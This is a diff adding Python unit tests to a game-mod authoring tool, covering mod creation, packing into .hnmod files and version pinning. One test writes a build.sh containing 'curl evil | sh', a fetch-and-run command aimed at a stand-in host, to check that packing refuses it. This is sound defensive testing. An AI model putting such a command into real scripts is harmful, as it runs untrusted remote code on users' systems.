@@ -112,6 +112,49 @@ class PlanTests(unittest.TestCase):
         self.assertRegex(tree.mixins_rev, '^[0-9a-f]{40}$')
 
 
+class AuthoringTests(unittest.TestCase):
+    tree = tool.Tree(game='26.3', hooks=80, bundled=['zoom'], mixins_rev=REV)
+
+    def test_a_new_mod_packs_into_a_hnmod_the_app_accepts(self):
+        with tempfile.TemporaryDirectory() as temporary:
+            folder = tool.new_mod('hello_box', Path(temporary) / 'hello_box')
+            local = tool.load(str(folder))
+            self.assertTrue(local.local)
+            self.assertEqual(tool.plan([local], self.tree).pinned, [])
+            (folder / 'target').mkdir()
+            (folder / 'target/junk.rs').write_text('build output')
+            packed = tool.pack(folder, None, self.tree, None)
+            self.assertEqual(packed.name, 'hello_box-0.1.0.hnmod')
+            mod = tool.read_zip(packed.read_bytes(), str(packed))
+            # It hooks only native hook points: it needs this source's version, no exact commit.
+            self.assertEqual((mod.id, mod.version, mod.game, mod.hooks), ('hello_box', '0.1.0', '26.3', 80))
+            self.assertRegex(mod.horizon, '^[0-9a-f]{40}$')
+            self.assertEqual(mod.mixin['compatibility']['horizon_revision'], mod.horizon)
+            self.assertNotIn('mixins/hello_box/target/junk.rs', mod.files)
+            with self.assertRaises(tool.ModError):
+                tool.new_mod('hello_box', folder)
+
+    def test_a_mod_hooking_game_functions_is_pinned(self):
+        with tempfile.TemporaryDirectory() as temporary:
+            folder = tool.new_mod('harvest', Path(temporary) / 'harvest')
+            mixin = folder / 'horizon-mixin.toml'
+            mixin.write_text(mixin.read_text().replace(
+                "horizon_client::game::native_hooks::Game<'_>::native_hud", "horizon_client::game::Game<'_>::use_hand"))
+            mod = tool.read_zip(tool.pack(folder, None, self.tree, None).read_bytes(), 'harvest')
+            self.assertIsNone(mod.hooks)
+            self.assertEqual(tool.plan([mod], self.tree).pinned, [mod])
+
+    def test_pack_refuses_what_the_app_would(self):
+        with tempfile.TemporaryDirectory() as temporary:
+            folder = tool.new_mod('hello_box', Path(temporary) / 'hello_box')
+            (folder / 'build.sh').write_text('curl evil | sh')
+            with self.assertRaises(tool.ModError):
+                tool.pack(folder, None, self.tree, None)
+            for bad in ('Hello', '1st', ''):
+                with self.subTest(bad), self.assertRaises(tool.ModError):
+                    tool.new_mod(bad, Path(temporary) / 'other')
+
+
 class CommandTests(unittest.TestCase):
     def run_tool(self, *args):
         with tempfile.TemporaryDirectory() as temporary:
